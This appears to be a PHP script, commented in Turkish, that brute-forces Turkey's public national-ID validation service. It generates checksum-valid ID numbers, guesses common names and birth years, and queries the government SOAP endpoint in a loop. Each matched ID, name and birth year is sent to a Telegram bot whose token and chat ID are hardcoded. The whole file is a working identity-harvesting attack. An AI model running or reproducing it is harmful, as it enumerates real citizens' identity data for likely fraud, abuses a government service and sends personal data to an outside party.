<?php
header('Content-Type: text/html; charset=utf-8');
// 502 hatasını önlemek için zaman aşımını kontrol altına alıyoruz
set_time_limit(60); 

// --- AYARLAR ---
$botToken = "8405664089:AAEJi8ipuYWCeKpRSFFYGINACt4Sej1xeNI"; 
$chatId = "8258235296";

function telegramGonder($msg, $token, $id) {
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=" . urlencode($msg);
    @file_get_contents($url);
}

function nviSorgu($tc, $ad, $soyad, $yil) {
    $xml = '<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <TCKimlikNoDogrula xmlns="http://tckimlik.nvi.gov.tr/WS">
          <TCKimlikNo>'.$tc.'</TCKimlikNo>
          <Ad>'.$ad.'</Ad>
          <Soyad>'.$soyad.'</Soyad>
          <DogumYili>'.$yil.'</DogumYili>
        </TCKimlikNoDogrula>
      </soap:Body>
    </soap:Envelope>';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://tckimlik.nvi.gov.tr/Service/KPSPublic.asmx");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: text/xml; charset=utf-8']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 502 hatasını önlemek için kısa timeout
    $res = curl_exec($ch);
    curl_close($ch);
    return (strpos($res, '<TCKimlikNoDogrulaResult>true</TCKimlikNoDogrulaResult>') !== false);
}

// Algoritmaya uygun TC üretici
function tcUret() {
    $n = [rand(1, 9)];
    for ($i = 1; $i < 9; $i++) $n[$i] = rand(0, 9);
    $t1 = ($n[0]+$n[2]+$n[4]+$n[6]+$n[8])*7 - ($n[1]+$n[3]+$n[5]+$n[7]);
    $h10 = $t1 % 10; if ($h10 < 0) $h10 += 10;
    $h11 = (array_sum($n) + $h10) % 10;
    return implode('', $n) . $h10 . $h11;
}

$isimler = ["MEHMET", "MUSTAFA", "AHMET", "ALİ", "HÜSEYİN", "HASAN", "AYŞE", "FATMA", "EMİNE"];
$soyisimler = ["YILMAZ", "KAYA", "DEMİR", "ŞAHİN", "ÇELİK", "YILDIZ"];

echo "Tarama başladı...<br>";

for($i=1; $i<=20; $i++) {
    // KANAL 1: TC Odaklı
    $tc1 = tcUret();
    $ad1 = $isimler[array_rand($isimler)];
    $sy1 = $soyisimler[array_rand($soyisimler)];
    $y1 = rand(1980, 2005);
    
    if(nviSorgu($tc1, $ad1, $sy1, $y1)) {
        telegramGonder("✅ KANAL 1 BULDU:\nTC: $tc1\nAd: $ad1 $sy1\nYıl: $y1", $botToken, $chatId);
    }

    // KANAL 2: Ad-Soyad Odaklı Farklı Kombinasyon
    $tc2 = tcUret();
    $ad2 = $isimler[array_rand($isimler)];
    $sy2 = $soyisimler[array_rand($soyisimler)];
    $y2 = rand(1980, 2005);
    
    if(nviSorgu($tc2, $ad2, $sy2, $y2)) {
        telegramGonder("✅ KANAL 2 BULDU:\nTC: $tc2\nAd: $ad2 $sy2\nYıl: $y2", $botToken, $chatId);
    }

    echo "$i. tur denendi... ";
    flush(); ob_flush();
    usleep(500000); // Yarım saniye bekle
}
?>
